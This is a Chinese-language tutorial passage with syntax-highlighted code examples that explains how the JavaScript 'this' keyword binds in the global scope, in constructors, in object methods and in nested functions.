<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  <span class="attr">describe</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;姓名：&#x27;</span>+ <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">person.<span class="title function_">describe</span>()</span><br><span class="line"><span class="comment">// &quot;姓名：张三&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>this.name</code>表示<code>name</code>属性所在的那个对象。由于<code>this.name</code>是在<code>describe</code>方法中调用，而<code>describe</code>方法所在的当前对象是<code>person</code>，因此<code>this</code>指向<code>person</code>，<code>this.name</code>就是<code>person.name</code>。</p>
<p>由于对象的属性可以赋给另一个对象，所以属性所在的当前对象是可变的，即<code>this</code><strong>的指向是可变的</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  <span class="attr">describe</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;姓名：&#x27;</span>+ <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">B.<span class="property">describe</span> = A.<span class="property">describe</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 此时B的值：</span></span><br><span class="line"><span class="comment">B=&#123;</span></span><br><span class="line"><span class="comment">	name: &#x27;李四&#x27;,</span></span><br><span class="line"><span class="comment">    describe: function () &#123;</span></span><br><span class="line"><span class="comment">        return &#x27;姓名：&#x27;+ this.name;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">B.<span class="title function_">describe</span>() <span class="comment">// B内部的this指向B对象</span></span><br><span class="line"><span class="comment">// &quot;姓名：李四&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>A.describe</code>属性被赋给<code>B</code>，于是<code>B.describe</code>就表示<code>describe</code>方法所在的当前对象是<code>B</code>，所以<code>this.name</code>就指向<code>B.name</code>。</p>
<p>稍稍重构这个例子，<code>this</code>的动态指向就能看得更清楚。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;姓名：&#x27;</span>+ <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  <span class="attr">describe</span>: f</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span>,</span><br><span class="line">  <span class="attr">describe</span>: f</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">A.<span class="title function_">describe</span>() <span class="comment">// &quot;姓名：张三&quot;</span></span><br><span class="line">B.<span class="title function_">describe</span>() <span class="comment">// &quot;姓名：李四&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，函数<code>f</code>内部使用了<code>this</code>关键字，随着<code>f</code>所在的对象不同，<code>this</code>的指向也不同。</p>
<p>只要函数被赋给另一个变量，<code>this</code>的指向就会变。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  <span class="attr">describe</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;姓名：&#x27;</span>+ <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;李四&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> f = A.<span class="property">describe</span>;</span><br><span class="line"><span class="title function_">f</span>() <span class="comment">// &quot;姓名：李四&quot; f函数中的this和name变量所在的对象都为window顶层对象</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>A.describe</code>被赋值给变量<code>f</code>，内部的<code>this</code>就会指向<code>f</code>运行时所在的对象（本例是顶层对象）。</p>
<p>再看一个网页编程的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;age&quot;</span> size=<span class="number">3</span> onChange=<span class="string">&quot;validate(this, 18, 99);&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params">obj, lowval, hival</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">if</span> ((obj.<span class="property">value</span> &lt; lowval) || (obj.<span class="property">value</span> &gt; hival))</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Invalid Value!&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>上面代码是一个文本输入框，每当用户输入一个值，就会调用<code>onChange</code>回调函数，验证这个值是否在指定范围。浏览器会向回调函数传入当前对象，因此<code>this</code>就代表传入当前对象（即文本框），然后就可以从<code>this.value</code>上面读到用户的输入值。</p>
<p> 总结一下，<strong>JavaScript 语言之中，一切皆对象，运行环境也是对象，所以函数都是在某个对象之中运行，<code>this</code>就是函数运行时所在的对象（环境）</strong>。这本来并不会让用户糊涂，但是 JavaScript 支持运行环境动态切换，也就是说，<code>this</code>的指向是动态的，没有办法事先确定到底指向哪个对象，这才是最让初学者感到困惑的地方。 </p>
<h3 id="2、实质"><a href="#2、实质" class="headerlink" title="2、实质"></a>2、实质</h3><p>JavaScript 语言之所以有 this 的设计，跟内存里面的数据结构有关系。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">foo</span>:  <span class="number">5</span> &#125;;</span><br></pre></td></tr></table></figure>

<p>上面的代码将一个对象赋值给变量<code>obj</code>。JavaScript 引擎会先在内存里面，生成一个对象<code>&#123; foo: 5 &#125;</code>，然后把这个对象的内存地址赋值给变量<code>obj</code>。也就是说，变量<code>obj</code>是一个地址（reference）。后面如果要读取<code>obj.foo</code>，引擎先从<code>obj</code>拿到内存地址，然后再从该地址读出原始的对象，返回它的<code>foo</code>属性。</p>
<p>原始的对象以字典结构保存，每一个属性名都对应一个属性描述对象。举例来说，上面例子的<code>foo</code>属性，实际上是以下面的形式保存的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">foo</span>: &#123;</span><br><span class="line">    [[value]]: <span class="number">5</span></span><br><span class="line">    [[writable]]: <span class="literal">true</span></span><br><span class="line">    [[enumerable]]: <span class="literal">true</span></span><br><span class="line">    [[configurable]]: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，<code>foo</code>属性的值保存在属性描述对象的<code>value</code>属性里面。</p>
<p> 这样的结构是很清晰的，问题在于属性的值可能是一个函数。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">foo</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125; &#125;;</span><br></pre></td></tr></table></figure>

<p>这时，<strong>引擎会将函数单独保存在内存中</strong>，然后再将函数的地址赋值给<code>foo</code>属性的<code>value</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">foo</span>: &#123;</span><br><span class="line">    [[value]]: 函数的地址</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">f</span>: f &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单独执行</span></span><br><span class="line"><span class="title function_">f</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// obj 环境执行</span></span><br><span class="line">obj.<span class="title function_">f</span>()</span><br></pre></td></tr></table></figure>

<p>JavaScript 允许在函数体内部，引用当前环境的其他变量。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，函数体里面使用了变量<code>x</code>。该变量由运行环境提供。</p>
<p>现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在函数体内部获得当前的运行环境（context）。所以，<code>this</code>就出现了，<strong>它的设计目的就是在函数体内部，指代函数当前的运行环境</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">x</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，函数体里面的<code>this.x</code>就是指当前运行环境的<code>x</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">x</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">f</span>: f,</span><br><span class="line">  <span class="attr">x</span>: <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单独执行</span></span><br><span class="line"><span class="title function_">f</span>() <span class="comment">// 1  f方法当前运行环境为window对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// obj 环境执行</span></span><br><span class="line">obj.<span class="title function_">f</span>() <span class="comment">// 2 f方法当前运行环境为obj对象</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，函数<code>f</code>在全局环境执行，<code>this.x</code>指向全局环境的<code>x</code>；在<code>obj</code>环境执行，<code>this.x</code>指向<code>obj.x</code>。</p>
<h3 id="3、使用场合"><a href="#3、使用场合" class="headerlink" title="3、使用场合"></a>3、使用场合</h3><p> <code>this</code>主要有以下几个使用场合。 </p>
<h4 id="（1）全局环境"><a href="#（1）全局环境" class="headerlink" title="（1）全局环境"></a>（1）全局环境</h4><p>全局环境使用<code>this</code>，它指的就是顶层对象<code>window</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span> === <span class="variable language_">window</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === <span class="variable language_">window</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f</span>() <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码说明，不管是不是在函数内部，只要是在全局环境下运行，<code>this</code>就是指顶层对象<code>window</code>。</p>
<h4 id="（2）构造函数"><a href="#（2）构造函数" class="headerlink" title="（2）构造函数"></a>（2）构造函数</h4><p>构造函数中的<code>this</code>，指的是实例对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Obj</span> = <span class="keyword">function</span> (<span class="params">p</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">p</span> = p; <span class="comment">// this指向实例对象，在实例对象上定义属性p等于p值</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title class_">Obj</span>(<span class="string">&#x27;Hello World!&#x27;</span>); <span class="comment">// 通过new构造函数来声明实例对象o</span></span><br><span class="line">o.<span class="property">p</span> <span class="comment">// &quot;Hello World!&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码定义了一个构造函数<code>Obj</code>。由于<code>this</code>指向实例对象，所以在构造函数内部定义<code>this.p</code>，就相当于定义实例对象有一个<code>p</code>属性。</p>
<h4 id="（3）对象的方法"><a href="#（3）对象的方法" class="headerlink" title="（3）对象的方法"></a>（3）对象的方法</h4><p>如果对象的方法里面包含<code>this</code>，<code>this</code>的指向就是方法运行时所在的对象。该方法赋值给另一个对象，就会改变<code>this</code>的指向。</p>
<p>但是，这条规则很不容易把握。请看下面的代码。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj =&#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">foo</span>() <span class="comment">// obj</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>obj.foo</code>方法执行时，它内部的<code>this</code>指向<code>obj</code>。</p>
<p>但是，下面这几种用法，都会改变<code>this</code>的指向。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 情况一</span></span><br><span class="line">(obj.<span class="property">foo</span> = obj.<span class="property">foo</span>)() <span class="comment">// window</span></span><br><span class="line"><span class="comment">// 情况二</span></span><br><span class="line">(<span class="literal">false</span> || obj.<span class="property">foo</span>)() <span class="comment">// window</span></span><br><span class="line"><span class="comment">// 情况三</span></span><br><span class="line">(<span class="number">1</span>, obj.<span class="property">foo</span>)() <span class="comment">// window</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//obj.foo 是一个内存地址，它直接取出了 function () &#123;console.log(this);&#125; ，可以把obj.foo看做function () &#123;console.log(this);&#125;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>obj.foo</code>就是一个值。这个值真正调用的时候，运行环境已经不是<code>obj</code>了，而是全局环境，所以<code>this</code>不再指向<code>obj</code>。</p>
<p>可以这样理解，JavaScript 引擎内部，**<code>obj</code>和<code>obj.foo</code>储存在两个内存地址<strong>，称为地址一和地址二。<code>obj.foo()</code>这样调用时，是从地址一调用地址二，因此地址二的运行环境是地址一，<code>this</code>指向<code>obj</code>。但是，</strong>上面三种情况，都是直接取出地址二进行调用，这样的话，运行环境就是全局环境，因此<code>this</code>指向全局环境**。上面三种情况等同于下面的代码。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//obj.foo 是一个内存地址，它直接取出了 function () &#123;console.log(this);&#125; ，可以把obj.foo看做function () &#123;console.log(this);&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 情况一</span></span><br><span class="line">(obj.<span class="property">foo</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;)()</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 情况二</span></span><br><span class="line">(<span class="literal">false</span> || <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 情况三</span></span><br><span class="line">(<span class="number">1</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>如果<code>this</code>所在的方法不在对象的第一层，这时<code>this</code>只是指向当前一层的对象，而不会继承更上面的层。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="attr">p</span>: <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">  <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">m</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.<span class="property">b</span>.<span class="title function_">m</span>() <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>a.b.m</code>方法在<code>a</code>对象的第二层，该方法内部的<code>this</code>不是指向<code>a</code>，而是指向<code>a.b</code>，因为实际执行的是下面的代码。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b = &#123;</span><br><span class="line">  <span class="attr">m</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">p</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="attr">p</span>: <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">  <span class="attr">b</span>: b</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(a.<span class="property">b</span>).<span class="title function_">m</span>() <span class="comment">// 等同于 b.m()</span></span><br></pre></td></tr></table></figure>

<p>如果要达到预期效果，只有写成下面这样。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">m</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">p</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">p</span>: <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>如果这时将嵌套对象内部的方法赋值给一个变量，<code>this</code>依然会指向全局对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">m</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">p</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">p</span>: <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hello = a.<span class="property">b</span>.<span class="property">m</span>; <span class="comment">// 把方法的内存地址赋值给了hello</span></span><br><span class="line"><span class="title function_">hello</span>() <span class="comment">// undefined  内部this指向window</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>m</code>是多层对象内部的一个方法。为求简便，将其赋值给<code>hello</code>变量，结果调用时，<code>this</code>指向了顶层对象。为了避免这个问题，可以只将<code>m</code>所在的对象赋值给<code>hello</code>，这样调用时，<code>this</code>的指向就不会变。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hello = a.<span class="property">b</span>;</span><br><span class="line">hello.<span class="title function_">m</span>() <span class="comment">// Hello   this指向不变</span></span><br></pre></td></tr></table></figure>

<h3 id="4、使用注意点"><a href="#4、使用注意点" class="headerlink" title="4、使用注意点"></a>4、使用注意点</h3><h4 id="（1）避免多层-this"><a href="#（1）避免多层-this" class="headerlink" title="（1）避免多层 this"></a>（1）避免多层 this</h4><p> 由于<code>this</code>的指向是不确定的，所以切勿在函数中包含多层的<code>this</code>。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">f1</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">// this指向o对象</span></span><br><span class="line">    <span class="keyword">var</span> f2 = <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="comment">// 方法会另起一个内存地址</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">// this指向window对象</span></span><br><span class="line">    &#125;();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.<span class="title function_">f1</span>()</span><br><span class="line"><span class="comment">// Object</span></span><br><span class="line"><span class="comment">// Window</span></span><br></pre></td></tr></table></figure>

<p>上面代码包含两层<code>this</code>，结果运行后，第一层指向对象<code>o</code>，第二层指向全局对象，因为实际执行的是下面的代码。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> temp = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">f1</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">    <span class="keyword">var</span> f2 = <span class="title function_">temp</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个解决方法是在第二层改用一个指向外层<code>this</code>的变量。</p>
